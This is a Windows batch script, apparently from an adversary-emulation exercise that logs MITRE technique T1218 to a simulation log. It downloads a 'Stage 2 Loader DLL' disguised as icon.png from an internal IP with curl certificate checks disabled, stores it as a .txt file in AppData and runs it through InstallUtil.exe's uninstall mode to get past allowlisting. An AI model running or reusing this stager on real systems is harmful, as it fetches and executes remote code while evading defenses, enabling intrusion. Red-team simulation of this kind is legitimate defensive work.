@echo off
SETLOCAL EnableDelayedExpansion

REM ===== PLACEHOLDER CONSTANTS (random-named SET variables) =====
SET aBcD1234=%APPDATA%\11161\701bfe98
SET eFgH5678=00c84b3f.txt
SET iJkL9012=https://10.0.0.49/stage/2/icon.png?11161-7
SET mNoP3456=ITZEL-S2B
SET qRsT7890=11161
SET uVwX1234=7
SET yZaB5678=%PUBLIC%\\macula-simulations.log

REM ===== TIMESTAMP CACHE =====
SET tsvar=!DATE!/!TIME!

REM ===== CORE FUNCTIONALITY =====
REM 1. Heartbeat fetch — download the Stage 2 Loader DLL
echo [!tsvar!][DEBUG][!mNoP3456!][!qRsT7890!]: heartbeat_start>> "!yZaB5678!" 2>nul
curl -k -s -o "!aBcD1234!\!eFgH5678!" "!iJkL9012!"
set curl_exitcode=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!mNoP3456!][!qRsT7890!]: heartbeat_complete=!curl_exitcode!>> "!yZaB5678!" 2>nul

REM 2. Change working directory to the output directory
echo [!tsvar!][DEBUG][!mNoP3456!][!qRsT7890!]: chdir_start>> "!yZaB5678!" 2>nul
cd /d "!aBcD1234!" >nul 2>&1
set cd_exitcode=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!mNoP3456!][!qRsT7890!]: chdir_result=!cd_exitcode!>> "!yZaB5678!" 2>nul

REM 3. Invoke the downloaded Stage 2 Loader DLL via InstallUtil.exe (Uninstall method)
echo [!tsvar!][DEBUG][!mNoP3456!][!qRsT7890!]: installutil_start>> "!yZaB5678!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "!eFgH5678!" >NUL 2>&1
set installutil_exitcode=%ERRORLEVEL%
echo [!tsvar!][DEBUG][!mNoP3456!][!qRsT7890!]: installutil_result=!installutil_exitcode!>> "!yZaB5678!" 2>nul

REM 4. Logging — append one TTP log line
set result_var=OK
set error_var=
if not !installutil_exitcode!==0 (
    set result_var=FAIL
    set error_var=InstallUtil returned errorlevel !installutil_exitcode!
)
echo [!tsvar!][TTP][!mNoP3456!][!qRsT7890!]: T1218^|System Binary Proxy Execution=!result_var!:!error_var!>> "!yZaB5678!" 2>nul

ENDLOCAL